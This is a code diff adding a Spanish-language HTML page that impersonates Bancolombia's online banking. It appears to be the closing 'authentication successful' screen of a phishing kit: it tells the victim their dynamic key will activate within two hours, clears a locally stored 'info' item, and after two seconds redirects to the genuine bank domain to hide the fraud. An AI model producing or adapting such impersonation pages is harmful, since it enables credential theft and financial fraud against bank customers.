@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+	<title>Bancolombia Sucursal Virtual Personas</title>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<script src="./js/validations.js"></script>
+	<link href="./css/style.css" rel="stylesheet">
+	<link href="./css/stylesheet.css" rel="stylesheet">
+	<link rel="icon" type="image/png" href="img/logo.png" />
+</head>
+
+<body>
+	<div style="text-align:center;  margin-top: 13%;">
+		<img src="img/logo.svg">
+
+		<br><br>
+		<img src="img/finalizar2.jpg" width="120">
+
+		<br><br>
+		<p class="text-center"
+			style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 18px;">
+			Autenticación Exitosa
+		</p><br><br>
+		<p class="text-center"
+			style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 14px;">
+			Información verificada correctamente. En el transcurso de 2 horas, su clave dinámica quedará activa.
+		</p><br>
+		<img src="img/load3.gif" />
+
+		<br>
+		<div class="ippie" style="padding: 0px 7%;">
+			<span class="dirip">Dirección IP: <span id="ip"></span></span>´
+			<span class="copyright">Copyright © 2023 Bancolombia</span>
+		</div><br><br>
+
+
+
+	</div>
+
+
+
+	<meta http-equiv="PRAGMA" content="NO-CACHE">
+	<meta http-equiv="Expires" content="-1">
+</body>
+
+</html>
+
+<script language="javascript">
+
+	let identificadorTiempoDeEspera;
+
+	window.localStorage.removeItem('info');
+
+	function temporizadorDeRetraso() {
+		identificadorTiempoDeEspera = setTimeout(funcionConRetraso, 2000);
+	}
+
+	function funcionConRetraso() {
+		window.location.href = "https://sucursalpersonas.transaccionesbancolombia.com";
+	}
+
+	document.addEventListener('DOMContentLoaded', function () {
+		temporizadorDeRetraso();
+	});
+
+
+</script>
